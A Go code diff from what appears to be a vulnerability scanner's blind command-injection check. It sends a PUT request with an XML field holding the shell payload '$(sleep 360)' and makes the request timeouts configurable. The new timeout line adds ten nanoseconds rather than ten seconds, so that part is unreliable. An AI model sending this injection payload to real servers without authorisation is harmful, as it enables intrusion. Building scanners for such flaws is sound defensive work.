@@ -165,7 +165,7 @@ func (target Target) checkBlind() Result {
 	req.Header.Set("Accept-Encoding", "gzip, deflate")
 	req.Header.Set("Accept-Language", "en-US,en;q=0.9,sv;q=0.8")
 	client := &http.Client{
-		Timeout: 12 * time.Second,
+		Timeout: time.Duration(target.timeout) * time.Second,
 	}
 	_, err := client.Do(req)
 	if err != nil {
@@ -173,7 +173,7 @@ func (target Target) checkBlind() Result {
 	}
 
 	// with payload
-	data = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(sleep 30)</language>"
+	data = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(sleep 360)</language>"
 	req, _ = http.NewRequest(http.MethodPut, full_url, strings.NewReader(data))
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
 	req.Header.Set("Host", fmt.Sprintf("%v:%v", target.host, target.port))
@@ -183,7 +183,7 @@ func (target Target) checkBlind() Result {
 	req.Header.Set("Accept-Language", "en-US,en;q=0.9,sv;q=0.8")
 
 	client = &http.Client{
-		Timeout: 15 * time.Second,
+		Timeout: time.Duration(target.timeout)*time.Second + 10,
 	}
 
 	_, err = client.Do(req)
